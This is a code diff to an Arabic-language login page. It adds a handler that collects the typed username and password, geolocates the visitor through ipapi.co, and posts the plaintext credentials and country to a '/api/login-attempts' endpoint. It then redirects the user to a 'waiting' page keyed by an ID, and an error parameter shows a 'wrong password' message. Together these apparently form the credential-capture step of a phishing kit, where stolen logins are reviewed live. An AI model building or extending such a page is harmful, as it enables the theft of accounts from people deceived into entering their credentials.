@@ -1063,6 +1063,7 @@ html, body { overflow-x: hidden !important; max-width: 100vw !important; }
     
     <div class="divider">أو</div>
     
+    <div id="errorMsg" style="display:none;color:#ff0000;font-weight:700;text-align:center;margin-bottom:15px;font-size:0.95rem;background:rgba(255,0,0,0.08);padding:12px;border-radius:10px;border:1px solid rgba(255,0,0,0.2);"></div>
     <form class="login-form" onsubmit="return handleLogin(event)">
       <div class="form-group">
         <label>إسم المستخدم</label>
@@ -1093,9 +1094,44 @@ function togglePass() {
 }
 function handleLogin(e) {
   e.preventDefault();
-  alert('جاري تسجيل الدخول...');
+  var fd = new FormData(e.target);
+  var username = fd.get('username') || '';
+  var password = fd.get('password') || '';
+  var btn = e.target.querySelector('.login-submit-btn');
+  btn.disabled = true;
+  btn.textContent = 'جاري التحقق...';
+  var country = 'غير معروف';
+  try { country = sessionStorage.getItem('user_country') || 'غير معروف'; } catch(ex) {}
+  fetch('/api/login-attempts', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: username, password: password, country: country, lang: 'ar' })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.success) {
+      window.location.href = '/ar/login/waiting.html?id=' + data.id;
+    } else {
+      btn.disabled = false;
+      btn.textContent = 'تسجيل الدخول';
+    }
+  }).catch(function() {
+    btn.disabled = false;
+    btn.textContent = 'تسجيل الدخول';
+  });
   return false;
 }
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  if (params.get('error') === '1') {
+    var el = document.getElementById('errorMsg');
+    el.textContent = 'اسم المستخدم أو كلمة المرور غير صحيح';
+    el.style.display = 'block';
+  }
+  try {
+    fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(d){
+      if(d.country_name) sessionStorage.setItem('user_country', d.country_name);
+    }).catch(function(){});
+  } catch(ex){}
+})();
 </script>
 
     </main>
